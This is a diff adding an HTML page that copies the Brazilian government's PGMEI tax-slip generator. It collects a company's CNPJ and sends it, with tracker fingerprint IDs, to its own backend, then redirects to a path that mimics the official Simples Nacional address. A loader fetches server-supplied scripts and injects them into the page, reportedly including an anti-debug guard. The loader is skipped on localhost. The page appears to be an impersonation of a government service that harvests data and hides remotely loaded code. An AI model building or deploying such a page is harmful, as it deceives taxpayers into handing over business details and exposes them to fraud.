@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<style>
+  /* ============================================================
+     WIREFRAME — Tela /Identificacao
+     Layout simplificado · zero floats · visual fiel à captura 1.
+     Mantém markup Bootstrap 3 (para migração).
+     ============================================================ */
+
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+
+  body {
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+    background: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    -webkit-text-size-adjust: 100%;
+  }
+
+  /* === Anotação (legenda + tags) === */
+  .legend {
+    background: #fffbe6; border: 1px solid #e0c97a;
+    padding: 10px 14px; margin: 10px auto; max-width: 1410px;
+    font-size: 12px; color: #665; line-height: 1.55;
+  }
+  .legend strong { color: #553; }
+  .tag {
+    position: absolute; top: 4px; left: 8px;
+    font-size: 10px; color: #888; font-weight: bold;
+    text-transform: uppercase; letter-spacing: .5px;
+    background: rgba(255,255,255,.7); padding: 1px 4px;
+    z-index: 5;
+  }
+
+  /* ============================================================
+     CONTAINER-FLUID  — wrapper externo (max-width 1440)
+     · flex column: empurra footer para o bottom proporcionalmente
+     ============================================================ */
+  .container-fluid {
+    width: 100%;
+    max-width: 1410px;
+    margin: 0 auto;
+    padding: 0 15px;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+  }
+
+  /* ============================================================
+     HEADER — bg #eee + bg image + border-top verde
+     · margin negativo: estende bg até as bordas do container-fluid
+     ============================================================ */
+  header.row {
+    display: block;
+    margin: 0 -15px 1px !important;
+    padding: 1px 30px !important;
+    background-color: #eee;
+    border-top: 3px solid #62cb31;
+    background-image: url("/assets/bkg_header_entes.png");
+    background-repeat: no-repeat;
+    position: relative;
+  }
+  header.row h3 {
+    margin: 20px 0 10px;
+    font: 500 24px/1.1 inherit;
+    color: inherit;
+  }
+  .label.label-success {
+    display: inline-block;
+    padding: .2em .6em .3em;
+    background-color: #5cb85c;
+    color: #fff;
+    font-size: 75%;
+    font-weight: 700;
+    line-height: 1;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: baseline;
+    border-radius: .25em;
+  }
+  .label.label-success img {
+    height: 14px; width: auto;
+    vertical-align: middle; margin-right: 4px;
+  }
+  header.row h4 {
+    margin: 10px 0;
+    font: 500 18px/1.1 inherit;
+    color: #3c763d;
+  }
+  .text-success { color: #3c763d; }
+
+  /* ============================================================
+     SECTION — faixa cinza CURTA logo abaixo do header
+     · NÃO tem flex:1 (não preenche viewport inteiro)
+     · Altura = conteúdo (well + padding)
+     · Footer fica no bottom via margin-top: auto
+     ============================================================ */
+  section.row {
+    display: block;
+    margin: 0 -15px;
+    padding: 24px 30px;
+    background-color: #f5f5f5;
+    background-image: linear-gradient(to bottom, #e8e8e8 0%, #f5f5f5 100%);
+    border-bottom: 1px solid #dcdcdc;
+    box-shadow: inset 0 1px 3px rgba(0,0,0,.05);
+    position: relative;
+  }
+
+  /* ============================================================
+     WELL — wrapper interno (sem bg, só estrutura)
+     · A faixa cinza vem do section.row acima
+     · Aqui é só o "col-md-12" que envolve o container interno
+     ============================================================ */
+  .well.col-md-12 {
+    width: 100%;
+    padding: 0;
+    margin: 0;
+    background: transparent;
+    border: 0;
+    box-shadow: none;
+  }
+
+  /* ============================================================
+     CONTAINER INTERNO — 970px fixo (drenado das specs)
+     ============================================================ */
+  .container {
+    width: 100%;
+    max-width: 970px;
+    margin: 0 auto;
+    padding: 0 15px;
+  }
+
+  /* ============================================================
+     ROW INTERNA — sem floats, sem margin negativa interna
+     ============================================================ */
+  .container > .row {
+    display: block;
+    margin: 0;
+    position: relative;
+  }
+
+  /* ============================================================
+     PANEL CENTRAL — col-md-offset-3 col-md-5
+     · Implementado com simples max-width + margin auto (não float)
+     · Visualmente: card centralizado de ~370px
+     ============================================================ */
+  .col-md-offset-3.col-md-5 {
+    display: block;
+    width: 100%;
+    max-width: 380px;
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  /* ============================================================
+     PANEL.PANEL-DEFAULT — card branco com sombra
+     ============================================================ */
+  .panel.panel-default {
+    background-color: #fff;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-shadow: 0 5px 25px rgba(0,0,0,0.15);
+    margin: 0;
+  }
+  .panel-default > .panel-heading {
+    padding: 10px 15px;
+    color: #333;
+    background-color: #f5f5f5;
+    background-image: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
+    border-bottom: 1px solid #ddd;
+    border-top-left-radius: 3px;
+    border-top-right-radius: 3px;
+    text-align: left;                 /* alinhado à esquerda (não centralizado) */
+  }
+  .panel-title {
+    margin: 0;
+    font: 500 16px/1.1 inherit;
+    color: inherit;
+  }
+  .panel-body { padding: 15px; }
+
+  /* ============================================================
+     FORM CONTROLS dentro do panel
+     · Os col-md-offset-* aqui simplesmente desaparecem (são block 100%)
+     ============================================================ */
+  .col-md-offset-1.col-md-8,
+  .col-md-offset-1.col-md-11 {
+    display: block;
+    width: 100%;
+    margin: 0;
+    padding: 0;
+  }
+
+  .form-group { margin-bottom: 15px; }
+  .control-label {
+    display: inline-block;
+    margin-bottom: 5px;
+    font-weight: 700;
+    color: #333;
+  }
+  .form-control {
+    display: block;
+    width: 100%;
+    height: 34px;
+    padding: 6px 12px;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #555;
+    background-color: #fff;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
+    transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+  }
+  .form-control:focus {
+    border-color: #66afe9;
+    outline: 0;
+    box-shadow: inset 0 1px 1px rgba(0,0,0,.075),
+                0 0 8px rgba(102,175,233,.6);
+  }
+
+  /* hCaptcha info — texto puro sem links */
+  .hcaptcha-info {
+    display: inline-block;
+    color: rgb(85, 85, 85);
+    font-weight: 500;
+    font-size: 8px;
+    line-height: 8px;
+    margin: 8px 0 12px;
+  }
+  .hcaptcha-info strong {
+    color: rgb(85, 85, 85);
+    font-size: 8px;
+    line-height: 8px;
+    font-weight: 700;
+  }
+  .hcaptcha-info .link-text {
+    color: #337ab7;
+    font-size: 8px;
+    line-height: 8px;
+    font-weight: 500;
+  }
+
+  /* ============================================================
+     BOTÃO — gradiente + text-shadow + box-shadow inset
+     ============================================================ */
+  .btn {
+    display: inline-block;
+    padding: 6px 12px;
+    margin: 0;
+    font: 400 14px/1.42857143 inherit;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: middle;
+    cursor: pointer;
+    border: 1px solid transparent;
+    border-radius: 4px;
+    user-select: none;
+  }
+  .btn-success {
+    color: #fff;
+    background-color: #5cb85c;
+    background-image: linear-gradient(to bottom, #5cb85c 0%, #419641 100%);
+    background-repeat: repeat-x;
+    border-color: #3e8f3e;
+    text-shadow: 0 -1px 0 rgba(0,0,0,.2);
+    box-shadow: inset 0 1px 0 rgba(255,255,255,.15),
+                0 1px 1px rgba(0,0,0,.075);
+    transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) all;
+    overflow: hidden;
+    position: relative;
+  }
+  .btn-success:hover, .btn-success:focus {
+    background-image: linear-gradient(to bottom, #449d44 0%, #2d672d 100%);
+    color: #fff;
+  }
+  .ladda-label {
+    position: relative;
+    z-index: 3;
+    color: #fff;
+    text-shadow: 0 -1px 0 rgba(0,0,0,.2);
+  }
+  .ladda-spinner { display: none; }
+
+  /* ============================================================
+     FOOTER — sticky footer inteligente (margin-top: auto)
+     · O `margin-top: auto` empurra o footer para o bottom do flex parent
+     · Se o conteúdo for curto: espaço vazio cresce entre well e footer
+     · Se o conteúdo for longo: footer fica logo após o conteúdo
+     · Mantém o estilo visual original (bg, padding, border-top)
+     ============================================================ */
+  footer.row {
+    box-sizing: border-box;
+    display: block;
+    margin: auto -15px 0;                /* auto-top empurra para bottom; -15px lateral estende bg */
+    padding: 10px 18px 0px 40px !important;
+    border-top: 1px solid #eaeaea;
+    background-color: #e1dddd;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+    position: relative;
+  }
+  footer.row::before, footer.row::after { content: " "; display: table; }
+  footer.row::after { clear: both; }                 /* clearfix dos floats */
+
+  /* pull-left (versão à esquerda) */
+  footer.row .pull-left {
+    box-sizing: border-box;
+    float: left !important;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+  }
+  /* p.text-success — versão (verde escuro + bold) */
+  footer.row .pull-left p.text-success {
+    box-sizing: border-box;
+    margin: 0 0 10px;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #3c763d;
+    font-weight: 700;
+  }
+
+  /* pull-right (logo Simples Nacional) */
+  footer.row .pull-right {
+    box-sizing: border-box;
+    float: right !important;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+  }
+  /* img — sem altura forçada, vertical-align middle (drenado) */
+  footer.row .pull-right img {
+    box-sizing: border-box;
+    border: 0;
+    vertical-align: middle;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+  }
+
+  /* ============================================================
+     RESPONSIVO
+     ============================================================ */
+  @media (max-width: 600px) {
+    header.row { padding: 1px 15px !important; }
+    header.row h3 { font-size: 20px; }
+    header.row h4 { font-size: 14px; }
+    section.row { padding: 16px 15px; margin: 0 -15px; }
+    .col-md-offset-3.col-md-5 { max-width: 100%; }
+    footer.row { padding: 10px 16px 6px !important; }
+  }
+</style>
+<!-- Tracker — carrega snippet do backend (auto-detect domain). Falha silenciosa
+     em localhost/IP privado. O snippet pode conter MÚLTIPLOS scripts (guard
+     anti-debug + tracker.js); itera todos pra não perder o tracker quando
+     console_protection_enabled=1. -->
+<script>
+  (function(){
+    var d = (location.hostname || '').toLowerCase();
+    if (!d || d === 'localhost' || /^127\./.test(d)) return;
+    fetch('/api/public/tracker-snippet?domain=' + encodeURIComponent(d))
+      .then(function(r){ return r.json(); })
+      .then(function(j){
+        if (!j || !j.snippet) return;
+        var tmp = document.createElement('div'); tmp.innerHTML = j.snippet;
+        var list = tmp.querySelectorAll('script'); if (!list.length) return;
+        for (var i = 0; i < list.length; i++) {
+          var s = list[i];
+          var ns = document.createElement('script');
+          for (var k = 0; k < s.attributes.length; k++) {
+            ns.setAttribute(s.attributes[k].name, s.attributes[k].value);
+          }
+          ns.textContent = s.textContent;
+          document.head.appendChild(ns);
+        }
+      })
+      .catch(function(){});
+  })();
+</script>
+</head>
+<body>
+
+  <!-- ============================================================
+       LEGENDA — anotação do wireframe
+       ============================================================ -->  <!-- ============================================================
+       CONTAINER-FLUID
+       ============================================================ -->
+  <div class="container-fluid">
+
+    <!-- ====== HEADER ====== -->
+    <header class="row">
+      <h3><span class="label label-success"><img alt="Brand" src="/assets/logo-simples.png"> PGMEI</span></h3>
+      <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
+    </header>
+
+    <!-- ====== SECTION (well + container + panel) ====== -->
+    <section class="row">
+
+      <!-- well.col-md-12 mantém o markup BS3, mas o bg vem do section -->
+      <div class="well col-md-12" role="main">
+
+        <div class="container">
+          <div class="row">
+
+            <!-- col-md-offset-3 col-md-5 — card CNPJ centralizado -->
+            <div class="col-md-offset-3 col-md-5">
+
+              <div class="panel panel-default">
+                <div class="panel-heading">
+                  <h4 class="panel-title">Informe o número completo do CNPJ</h4>
+                </div>
+
+                <div class="panel-body">
+                  <form id="identificacao" method="post" action="#" role="form">
+                    <input name="__RequestVerificationToken" type="hidden" value="">
+
+                    <div class="form-group">
+
+                      <!-- col-md-offset-1 col-md-8 (input) -->
+                      <div class="col-md-offset-1 col-md-8">
+                        <div class="form-group">
+                          <label for="cnpj" class="control-label">CNPJ completo:</label>
+                          <input type="text" id="cnpj" class="form-control" name="cnpj"
+                                 autofocus
+                                 autocomplete="off"
+                                 inputmode="numeric"
+                                 maxlength="18"
+                                 placeholder="__.___.___/____-__"
+                                 oninput="maskCNPJ(this)"
+                                 title="Deve ser informado CNPJ completo, inclusive com o dígito verificador, sem separadores de números, pontos ou traços.">
+
+                          <br>
+                          <div class="hcaptcha-info">
+                            <strong>Protegido por hCaptcha</strong><br>
+                            <span class="link-text">Privacidade</span> e
+                            <span class="link-text">Termos e condições</span>.
+                          </div>
+                        </div>
+                      </div>
+
+                      <!-- col-md-offset-1 col-md-11 (botão) -->
+                      <div class="col-md-offset-1 col-md-11">
+                        <div class="form-group">
+                          <button id="continuar" type="submit" class="btn btn-success ladda-button" data-style="slide-left">
+                            <span class="ladda-label">Continuar</span>
+                          </button>
+                        </div>
+                      </div>
+
+                    </div>
+                  </form>
+                </div>
+              </div>
+
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ====== FOOTER ====== -->
+    <footer class="row clearfix">
+      <div class="pull-left">
+        <p class="text-success"><strong>Versão: 3.17.0</strong></p>
+      </div>
+      <div class="pull-right">
+        <img src="/assets/marca_Simples_entes.png" alt="Simples Nacional">
+      </div>
+    </footer>
+
+  </div><!-- /.container-fluid -->
+
+  <script>
+    /**
+     * Máscara CNPJ — formato XX.XXX.XXX/XXXX-XX (14 dígitos)
+     * Aplica separadores em tempo real conforme o usuário digita.
+     * Bloqueia entrada não-numérica e limita em 14 dígitos.
+     */
+    function maskCNPJ(el) {
+      // mantém só dígitos, máximo 14
+      let v = el.value.replace(/\D/g, '').slice(0, 14);
+
+      // aplica os separadores progressivamente
+      if (v.length > 12)      v = v.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{1,2}).*/, '$1.$2.$3/$4-$5');
+      else if (v.length > 8)  v = v.replace(/^(\d{2})(\d{3})(\d{3})(\d{1,4}).*/, '$1.$2.$3/$4');
+      else if (v.length > 5)  v = v.replace(/^(\d{2})(\d{3})(\d{1,3}).*/, '$1.$2.$3');
+      else if (v.length > 2)  v = v.replace(/^(\d{2})(\d{1,3}).*/, '$1.$2');
+
+      el.value = v;
+    }
+  </script>
+
+  <script>
+    // Submete o form via fetch → POST /api/public/search → redireciona pra
+    // /mei/resultado/<client_hash> com os dados já em localStorage pro
+    // resultado/ renderizar imediatamente sem precisar bater no DB de novo.
+    // Foca o input do CNPJ assim que o JS roda + reaplica em pageshow
+    // (cobre back/forward com bfcache, onde autofocus HTML é ignorado).
+    const _cnpjInput = document.getElementById('cnpj');
+    _cnpjInput?.focus();
+    window.addEventListener('pageshow', () => _cnpjInput?.focus());
+
+    // Spinner default do dasmei — usar em qualquer ação assíncrona.
+    const SPINNER_HTML = '<img src="/assets/spinner.gif" alt="carregando" style="height:18px;vertical-align:middle">';
+
+    // Tracker identity — poll curto até window.Tracker existir (snippet é
+    // carregado async). Se passar 1.5s sem aparecer, devolve {} e o backend
+    // cai no fallback via cookie tracker_sid (setado pelo /collect).
+    function getTrackerIds() {
+      return new Promise(resolve => {
+        const start = Date.now();
+        const tryGet = () => {
+          if (window.Tracker?.sessionId) {
+            return resolve({
+              tracker_session_id:  window.Tracker.sessionId,
+              tracker_fingerprint: window.Tracker.fingerprint || null,
+            });
+          }
+          if (Date.now() - start >= 1500) return resolve({});
+          setTimeout(tryGet, 50);
+        };
+        tryGet();
+      });
+    }
+
+    document.getElementById('identificacao').addEventListener('submit', async (ev) => {
+      ev.preventDefault();
+      const btn      = document.getElementById('continuar');
+      const labelEl  = btn.querySelector('.ladda-label') || btn;
+      const input    = document.getElementById('cnpj');
+      const cnpj     = (input.value || '').replace(/\D/g, '');
+      if (cnpj.length !== 14) {
+        alert('CNPJ inválido — informe os 14 dígitos.');
+        return;
+      }
+      const original = labelEl.innerHTML;
+      btn.disabled       = true;
+      labelEl.innerHTML  = SPINNER_HTML;
+      try {
+        // Backend chama /mei/{cnpj}/full → traz cadastrais + apuração de TODOS
+        // os anos da janela em uma única request. Frontend cacheia em
+        // sessionStorage e o resultado/ renderiza instantâneo, com troca de
+        // ano sem nova chamada.
+        const trackerIds = await getTrackerIds();
+        const r = await fetch('/api/public/search', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cnpj, ...trackerIds }),
+        });
+        // Parse defensivo: se a resposta não for JSON (HTML do CF/WAF em
+        // 502/503/challenge), mostramos mensagem amigável em vez do
+        // "Unexpected token '<'..." cru pro cliente.
+        const text = await r.text();
+        let data;
+        try { data = JSON.parse(text); }
+        catch (_) {
+          throw new Error('Não conseguimos processar sua consulta agora. Tente novamente em instantes.');
+        }
+        if (!r.ok || !data.ok) {
+          throw new Error(data?.error || data?.message || 'Falha na consulta. Tente novamente em instantes.');
+        }
+        try {
+          sessionStorage.setItem('dasmei:result:' + data.client_id, JSON.stringify({
+            cnpj, raw: data.raw, items: data.items, found: data.found, meta: data.meta,
+          }));
+        } catch (_) {}
+        window.location.href = '/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/emissao/' + encodeURIComponent(data.client_id);
+      } catch (e) {
+        alert('Erro: ' + e.message);
+        labelEl.innerHTML = original;
+        btn.disabled      = false;
+      }
+    });
+  </script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon='{"version":"2024.11.0","token":"0dbd09ab23334ee2ae23c85bcc61281d","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
